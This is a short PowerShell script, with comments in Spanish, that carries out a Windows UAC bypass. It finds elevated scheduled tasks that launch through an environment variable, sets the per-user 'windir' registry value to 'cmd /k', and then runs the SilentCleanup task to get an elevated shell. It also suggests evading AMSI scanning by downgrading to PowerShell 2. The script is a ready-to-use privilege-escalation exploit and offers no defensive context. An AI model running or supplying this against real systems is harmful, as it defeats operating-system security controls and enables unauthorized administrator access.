echo "recomendaciones en caso de que no funcione:"
echo "1. ejecutarlo como powershell -noexit <nombre del script>"
echo "2. si amsi esta bloqueando la ejecucion del script, se recomienda hacer downgrade de powershell con el comando powershell -version 2"

echo "Identificando tareas programadas debiles a una inyeccion de variables de entorno..."
$task = Get-ScheduledTask |
  Where-Object { $_.State -ne "Disabled" -and
                 $_.Principal.Runlevel -ne "Limited" -and
                 $_.Principal.LogonType -ne "ServiceAccount" -and
                 $_.Actions[0].CimClass.CimClassName -eq "MSFT_TaskExecAction" -and
                 $_.Actions[0].Execute -match '^%.+%.+?$' }

$task

echo "Identificando el nombre de las variables de entorno debiles..."
$pattern = '(?<=\%).+?(?=\%)'
$testText = $task | ForEach-Object {(Get-ScheduledTask $_.TaskName).Actions[0]} | ForEach-Object {[regex]::Matches($_.Execute, $pattern).Value}
$testText

echo "Creando la clave de registro necesaria..."
Set-ItemProperty -Path HKCU:\Environment -Name windir -Value 'cmd /k "%1" %*' -Force

echo "Ejecutando la tarea programada..."
schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
